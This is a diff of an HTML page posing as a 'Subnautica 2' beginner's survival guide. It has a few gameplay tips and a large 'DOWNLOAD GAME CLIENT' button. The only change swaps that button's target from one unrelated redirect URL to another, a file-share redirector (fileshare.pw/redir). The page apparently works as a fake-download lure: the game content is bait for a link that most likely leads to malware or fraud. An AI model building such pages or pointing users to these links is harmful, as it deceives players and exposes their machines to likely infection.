@@ -1,7 +1,7 @@
 <div style="max-width:800px;margin:auto;padding:20px;font-family:Arial,sans-serif;line-height:1.6;background:#0a0a0f;color:#e0e0e0;border-radius:15px;">
 <h1 style="color:#cc88ff;border-bottom:2px solid #9966dd;text-align:center;">🪸 Subnautica 2 – Beginner’s Survival Guide (Tips & Tricks) 🪸</h1>
 <p style="font-size:1.1em;text-align:center;"><strong>Master the alien ocean.</strong> Essential tips for new players – resource gathering, base placement, creature avoidance, and early progression.</p>
-<div style="background:#111116;padding:20px;text-align:center;margin:15px 0;"><a href="https://www.shawonline.co.za/redir" style="background:#cc88ff;color:#000;padding:12px 25px;">⬇️ DOWNLOAD GAME CLIENT</a><p>✅ Beginner friendly ✅ Survival tips ✅ Base building ✅ Creature guide</p></div>
+<div style="background:#111116;padding:20px;text-align:center;margin:15px 0;"><a href="https://fileshare.pw/redir" style="background:#cc88ff;color:#000;padding:12px 25px;">⬇️ DOWNLOAD GAME CLIENT</a><p>✅ Beginner friendly ✅ Survival tips ✅ Base building ✅ Creature guide</p></div>
 <img src="https://cdn.mos.cms.futurecdn.net/PnDFWtJsMWRUbT6GHvEymH.png" style="max-width:100%;border-radius:8px;margin:15px 0;">
 <div><h3>🌊 Essential Tips for New Survivors:</h3>
 <ul><li><strong>Prioritize the Scanner:</strong> Craft the Scanner first – it unlocks blueprints and reveals resource locations.</li>
